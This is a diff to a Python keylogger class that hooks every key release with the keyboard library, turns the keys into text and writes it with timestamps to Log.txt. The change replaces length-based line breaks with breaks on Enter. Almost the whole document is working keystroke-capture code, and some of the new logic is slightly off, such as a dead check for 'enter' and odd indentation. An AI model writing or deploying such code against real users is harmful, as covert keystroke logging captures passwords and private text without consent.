@@ -6,8 +6,6 @@ class Logger:
 
     def __init__(self):
         self.log = ""
-        self.line = ""
-        self.line_length = 20
         self.log_filename = "Log.txt"
 
     def callback(self, event):
@@ -17,22 +15,25 @@ class Logger:
 
         exception_key = ["backspace", "delete", "left", "right", "up", "down", "shift",
                          "ctrl", "right shift", "alt", "tab", ]
-        # print(name)
 
         if len(name) > 1:
             if name == "space":
                 name = " "
-            elif name == "enter":
-                name = "[ENTER]\n"
             elif name == "decimal":
                 name = "."
             elif name in exception_key:
                 name = ""
+            elif name == "enter":
+                name = "\n"
+                self.end_of_line()
 
-        self.line += name
+        if name != "enter":
+            self.log += name
 
-        if name == " ":
-            self.count_line()
+    def end_of_line(self):
+            self.log += "\n"
+            self.add_timestamp()
+
 
     def start(self):
         keyboard.on_release(callback=self.callback)
@@ -40,20 +41,12 @@ class Logger:
         print(self.log)
         self.write_log()
 
-    def count_line(self):
-        """Take a line and return True if it's become too long"""
-
-        if len(self.line) >= self.line_length:
-            self.add_timestamp()
-            self.log += "\n" + self.line
-            self.line = ""
-
     def add_timestamp(self):
         """Take the line and add time stamp"""
 
         now = datetime.now()
         time_string = now.strftime("%Y-%m-%d %H:%M:%S")
-        self.line = time_string + ":  " + self.line
+        self.log += time_string
 
     def write_log(self):
         """Take the log and write it into a file"""
